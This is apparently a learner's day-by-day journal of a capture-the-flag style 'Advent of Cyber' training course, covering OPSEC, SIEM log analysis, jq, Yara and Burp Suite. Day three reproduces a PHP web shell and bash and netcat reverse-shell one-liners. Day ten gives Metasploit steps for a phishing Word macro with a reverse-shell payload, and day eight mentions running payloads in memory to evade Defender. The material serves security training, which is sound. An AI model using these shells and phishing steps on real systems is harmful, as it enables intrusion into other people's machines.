# AdventOfCyber #

### DAY ONE ###
Day one was a mostly pretty nicely put introduction to the environment and OPSEC in general. The tasks at hand required use of `file` and `exiftool` to gather information. We had to try figuring out stuff from github profiles and whatnot and learned how to go deeper by figuring out where the crumbles go to figure out the 'identity' of the character. It's starting to look it's going to be a fun little story.

More to the point - the `somg.mp3` file was instead a `.lnk` file that pointed to dowload a file from github and run it, thus 'infecting' the target pc with [THIS](https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1). It has a vanity card and it even is signed so we had to go on github and search for that line to find a profile and then follow it to figure out the 'name'. We also got a nice introduction to OPSEC


>Operational Security (OPSEC) is a term originally coined in the military to refer to the process of protecting sensitive information and operations from adversaries. The goal is to identify and eliminate potential vulnerabilities before the attacker can learn their identity.
>
>In the context of cyber security, when malicious actors fail to follow proper OPSEC practices, they might leave digital traces that can be pieced together to reveal their identity. Some common OPSEC mistakes include:
>
>* Reusing usernames, email addresses, or account handles across multiple platforms. One might assume that anyone trying to cover their tracks would remove such obvious and incriminating information, but sometimes, it's due to vanity or simply forgetfulness.
>* Using identifiable metadata in code, documents, or images, which may reveal personal information like device names, GPS coordinates, or timestamps.
>* Posting publicly on forums or GitHub (Like in this current scenario) with details that tie back to their real identity or reveal their location or habits.
>*    Failing to use a VPN or proxy while conducting malicious activities allows law enforcement to track their real IP address.
>
>You'd think that someone doing something bad would make OPSEC their top priority, but they're only human and can make mistakes, too.

It then follows a couple of real cases as examples of how *NOT* to do opsec:

>For example, here are some real-world OPSEC mistakes that led to some really big fails:
>### AlphaBay Admin Takedown ###
>
>One of the most spectacular OPSEC failures involved Alexandre Cazes, the administrator of AlphaBay, one of the largest dark web marketplaces:
>
>*    Cazes used the email address "pimp_alex_91@hotmail.com" in early welcome emails from the site.
>*    This email included his year of birth and other identifying information.
>*    He cashed out using a Bitcoin account tied to his real name.
>*    Cazes reused the username "Alpha02" across multiple platforms, linking his dark web identity to forum posts under his real name.
>
>### Chinese Military Hacking Group (APT1) ###
>
>There's also the notorious Chinese hacking group APT1, which made several OPSEC blunders:
>
>*    One member, Wang Dong, signed his malware code with the nickname "Ugly Gorilla".
>*    This nickname was linked to programming forum posts associated with his real name.
>*    The group used predictable naming conventions for users, code, and passwords.
>*    Their activity consistently aligned with Beijing business hours, making their location obvious.
>
>These failures provided enough information for cyber security researchers and law enforcement to publicly identify group members.

### DAY TWO ###

Day two starts with more introductions - this time it introduces the true-positive and false-positive concept of detecting and assessing the types of activity by security. FP when it's malicious activity and all hell can break loose. TP on sysadmin can make people mad. But then again - if it's legit a phonecall or email beforehand can help mitigate such situations. If it's not legit there won't be any response, right? But yeah, it's not all fun and games as there are so many variables that need the person in charge to do a lot of correlation and digging. Some things are more suspicious than others.
The activity itself had us 'login' to a SIEM \(Security Information and Event Management\) system and investigate some events that have been recorded. They also show us how to create columns so the logs are more readable, which is nice. We learn how to filter some more, gradually getting to the information about the source and whatnot, allowing us to identify malicious activity and we go even deeper, even identifying the powershell command that needed to be decoded and whatnot. Useful tool - [CyberChef](https://gchq.github.io/CyberChef/). For non-critical stuff, nothing personal or real it's okay to use that instance but to be sure it's better to have a local copy that runs completely locally. It can be had from [HERE](https://gchq.github.io/CyberChef/CyberChef_v10.19.4.zip). Anywho - we learn how to use that tool to decode Base64 - `FromBase64` and `Decode text` 'recipes' are needed to do that.

### DAY THREE ###

Third day started with a small recap of blue teaming and then we got to red teaming too. So that was more hands on and it gave me quite some fun! I poked and prodded around and now I know even more than bafore and getting the right idea is over half of the battle. Basically we had to figure out how the 'attacker' got the shell inside and do the same, using the code below to cat one file. Also I kinda feel like the question about IP is mislabeled as RED TEAM when info from that is only available in logs. And RED TEAMERS should know their IPs already...

Reverse shell.php:
>```html
><html>
><body>
><form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
><input type="text" name="command" autofocus id="command" size="50">
><input type="submit" value="Execute">
></form>
><pre>
><?php
>    if(isset($_GET['command'])) 
>    {
>        system($_GET['command'] . ' 2>&1'); 
>    }
>?>
></pre>
></body>
></html>
>```
Useful commands:
>| Command |	Use |
>| --- | --- |
>| `ls` | 	Will give you an idea of what files/directories surround you |
>| `pwd` | 	Will give you an idea of where in the system you are |
>| `whoami` | 	Will let you know who you are in the system |
>| `hostname` | 	The system name and potentially its role in the network |
>| `uname -a` | 	Will give you some system information like the OS, kernel version, and more |
>| `id` | 	If the current user is assigned to any groups |
>| `ifconfig` | 	Allows you to understand the system's network setup |
>| `bash -i >& /dev/tcp/<your-ip>/<port> 0>&1` | 	A command used to begin a reverse shell via bash |
>| `nc -e /bin/sh <your-ip> <port>` | 	A command used to begin a reverse shell via Netcat |
>| `find / -perm -4000 -type f 2>/dev/null` | 	Finds SUID (Set User ID) files, useful in privilege escalation attempts as it can sometimes be leveraged to execute binary with privileges of its owner (which is often root) |
>| `find / -writable -type  f 2>/dev/null \| grep -v "/proc/"` | 	Also helpful in privilege escalation attempts used to find files with writable permissions |

### DAY FOUR ###

Oof... Well that was something! It took me a bit to understand what I should do but it clicked! ANd I got to the finish line after all! It was mainly about MITRE and AtomicTests with some simple example of how would a Sigma rule look like.
[THIS](https://attack.mitre.org/) is useful... very useful indeed! Otherwise poking and prodding around to find what would work and such

### DAY FIVE ###

This one was really fun, straightforward and pretty 'hands-on'. Teaching how to use Burp Suite to intercept, modify and repeat the requests to leverage bugs and inject payloads or run commands on compromised machine. A good practice is to use `libxml_disable_entity_loader(true)`  before parsing any XML in code and also it's good to sanitise user input, no matter what. Other than just a fun little quick Burp Suite tutorial it wasn't anything specially difficult.
Burp Suite can be found [HERE](https://portswigger.net/burp/communitydownload)

### DAY SIX ###

In this one we played with sandbox to try Yara and FLOSS. Yara is great for detecting malicious looking code that tries to run and FLOSS is like `strings` but even more targeted for malware. Very simple day, quick analysis and that's that.

### DAY SEVEN ###

This day greeted me with a nice tool, JQ and it's QL! It's very useful for parsing JSON and with a pipe and tables we can get the output in a very readable format, straight in the terminal. Othwerwise day was full of JQ syntax and log-reading to get the information we're after.

For future reference:

> `jq -r '["Event_Time", "Event_Name", "User_Name", "Bucket_Name", "Key", "Source_IP"],(.Records[] | select(.eventSource == "s3.amazonaws.com" and .requestParameters.bucketName=="wareville-care4wares") | [.eventTime, .eventName, .userIdentity.userName // "N/A",.requestParameters.bucketName // "N/A", .requestParameters.key // "N/A", .sourceIPAddress // "N/A"]) | @tsv' cloudtrail_log.json | column -t -s $'\t'`

### DAY EIGHT ###

Okay, it's getting fun! Today we learned about `msfvenom` that's used to create code to get reverse shell. We also got a bit of PowerShell code to execute it and run it without defender noticing because it was ran in ram. Pretty simple and straightforward yet again.

>```C#
>$VrtAlloc = @"
>using System;
>using System.Runtime.InteropServices;

### DAY NINE ###

Risk assesment. Easy day, just a bit of thinking and it's done. Not much to say, risk assessment is just that. Couple questions and answers. Depending on those we can identify risks and maybe mitigate them. Pobody's nerfect!

### DAY TEN ###

Whoah! Tenth day already? Today we had to phish for some tasty reverse shell. So we had to prepare a payload using metasploit, they went nice and deep into how this and that works and whanot, all really nice and then we had to also use metasploit to listen for the reverse shell. We had a simulated mail exchange and after a short while a reverse shell was connected. Fun, not too complicated and fast *but* also very informative and gives me a basic understanding of tmetasploit. I can now explore around more confidently!

>You will use the Metasploit Framework to create the document with the malicious macro. This requires the following commands:
>
> *   Open a new terminal window and run `msfconsole` to start the Metasploit Framework
> *   `set payload windows/meterpreter/reverse_tcp` specifies the payload to use; in this case, it connects to the specified host and creates a reverse shell
> *   `use exploit/multi/fileformat/office_word_macro` specifies the exploit you want to use. Technically speaking, this is not an exploit; it is a module to create a document with a macro
> *   `set LHOST CONNECTION_IP` specifies the IP address of the attacker’s system, CONNECTION_IP in this case is the IP of the AttackBox
> *   `set LPORT 8888` specifies the port number you are going to listen on for incoming connections on the AttackBox
> *   `show options` shows the configuration options to ensure that everything has been set properly, i.e., the IP address and port number in this example
> *   `exploit` generates a macro and embeds it in a document
> *   `exit` to quit and return to the terminal

>We again will use the Metasploit Framework, but this time to listen for incoming connections when a target users opens our phishing Word document. This requires the following commands:
>
> *   Open a new terminal window and run `msfconsole` to start the Metasploit Framework
> *   `use multi/handler` to handle incoming connections
> *   `set payload windows/meterpreter/reverse_tcp` to ensure that our payload works with the payload used when creating the malicious macro
> *   `set LHOST CONNECTION_IP` specifies the IP address of the attacker’s system and should be the same as the one used when creating the document
> *   `set LPORT 8888` specifies the port number you are going to listen on and should be the same as the one used when creating the document
> *   `show options` to confirm the values of your options
> *   `exploit` starts listening for incoming connections to establish a reverse shell

### DAY ELEVEN ###

Oooh! WiFi cracking! Today we got a quick and simple tutorial how to get the password using bruteforce. Need to find the infamous rockyou.txt wordlist hehe
